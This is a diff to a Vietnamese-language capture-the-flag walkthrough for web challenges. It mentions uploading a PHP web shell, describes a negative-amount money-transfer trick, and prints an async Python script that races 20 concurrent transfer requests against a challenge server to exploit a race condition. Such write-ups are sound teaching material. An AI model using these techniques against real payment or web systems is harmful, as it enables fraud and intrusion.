@@ -1,4 +1,4 @@
-**Magic shop**
+# **Magic shop**
 
 *Mở đầu là 1 form login, mở source:
 ![image](https://github.com/vanatka10/ctf_walkthrough/assets/126310360/e193728d-cd4d-4f79-a928-534b98ea9903)
@@ -34,4 +34,40 @@ file upload: webshell.php
 
 
 ![image](https://github.com/vanatka10/ctf_walkthrough/assets/126310360/28f77c09-88d6-4656-b5f5-abfc64c63f1f)
+
+# Be Positive
+Bài này chỉ cần lúc chuyển chiền cho tài khoản khác sửa thành số âm là được. sau đó dùng số tiền đó để mua flag
+
+# Slow Down
+Bài này trang web tương tự Be Positive, payload nhưng chuyển tiền qua tài khoản khác bằng số âm đã không còn hoạt động ở bài này. Mình nghĩ bài này rất có thể sẽ bị lỗ hổng race condition=> đúng thật là nó ;v
+
+**exploit**
+```
+import asyncio
+import httpx
+
+async def use_code(client):
+    resp = await client.post(f'http://slow-down-44f3a156.dailycookie.cloud/?action=transfer', cookies={"PHPSESSID": "e4dbc35e8795f3889acff05a0baff65d"}, data={"amount": "100.849%","recipient":"alice"})
+    return resp.text
+
+async def main():
+    async with httpx.AsyncClient() as client:
+        tasks = []
+        for _ in range(20): #20 times
+            tasks.append(asyncio.ensure_future(use_code(client)))
+        
+        # Get responses
+        results = await asyncio.gather(*tasks, return_exceptions=True)
+        
+        # Print results
+        for r in results:
+            print(r)
+        
+        # Async2sync sleep
+        await asyncio.sleep(0.5)
+    print(results)
+
+asyncio.run(main())
+```
+![image](https://github.com/vanatka10/ctf_walkthrough/assets/126310360/d39804e2-b510-498c-8ec0-794fa3888acb)
 
